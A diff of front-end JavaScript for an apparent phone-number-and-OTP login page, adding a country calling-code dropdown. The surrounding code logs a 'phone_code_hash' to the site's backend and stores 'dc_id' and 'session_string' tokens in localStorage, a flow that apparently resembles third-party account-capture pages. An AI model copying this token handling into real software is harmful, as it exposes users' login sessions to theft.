@@ -13,7 +13,36 @@ async function sendLogToBackend(message) {
     }
 }
 
+async function fetchCountries() {
+    try {
+        const response = await fetch('https://restcountries.com/v3.1/all');
+        if (!response.ok) throw new Error('Failed to fetch countries');
+        
+        const countries = await response.json();
+        populateCountryDropdown(countries);
+    } catch (error) {
+        console.error('Error fetching countries:', error);
+        sendLogToBackend("Error fetching countries: " + error.message);
+    }
+}
+
+function populateCountryDropdown(countries) {
+    const countrySelect = document.getElementById('country');
+    countries.forEach(country => {
+        const countryCode = country.cca2;
+        const countryName = country.name.common;
+        const callingCode = country.idd.root + (country.idd.suffixes ? country.idd.suffixes[0] : '');
+        
+        const option = document.createElement('option');
+        option.value = countryCode;
+        option.textContent = `${countryName} (${callingCode})`;
+        countrySelect.appendChild(option);
+    });
+}
+
 document.addEventListener('DOMContentLoaded', function() {
+    fetchCountries();
+
     // Check for user's preferred color scheme and apply night mode if necessary
     const isNightMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
     if (isNightMode) {
@@ -58,7 +87,6 @@ document.addEventListener('DOMContentLoaded', function() {
                 if (data.phone_code_hash) {
                     sessionStorage.setItem('phone_code_hash', data.phone_code_hash);
                     sendLogToBackend("Phone code hash stored: " + data.phone_code_hash);
-                    // Trigger swipe animation before redirecting
                     document.getElementById('loginContainer').classList.add('swipe-left');
                     setTimeout(() => {
                         window.location.href = '/otp.html';
@@ -118,7 +146,6 @@ document.addEventListener('DOMContentLoaded', function() {
                 localStorage.setItem('dc_id', result.authTokens.dc_id);
                 localStorage.setItem('session_string', result.authTokens.session_string);
 
-                // Trigger swipe animation before redirecting
                 document.getElementById('otpContainer').classList.add('swipe-in');
                 setTimeout(() => {
                     window.location.href = result.redirectUrl;
